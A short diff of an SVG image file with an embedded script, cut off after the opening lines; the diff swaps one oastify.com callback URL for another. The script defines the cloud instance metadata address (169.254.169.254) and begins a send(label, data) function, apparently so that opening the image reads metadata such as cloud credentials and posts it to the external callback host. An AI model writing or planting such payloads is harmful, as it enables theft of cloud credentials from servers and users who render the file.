@@ -1,6 +1,6 @@
 <svg xmlns="http://www.w3.org/2000/svg">
 <script>
-const C = 'https://f4kjmaahx7ee12j5uj1emwhxkoqfea2z.oastify.com';
+const C = 'https://oumscj0qng4nrb9eksrnc576axgo4lsa.oastify.com';
 const meta = 'http://169.254.169.254/latest/meta-data';
 
 function send(label, data) {
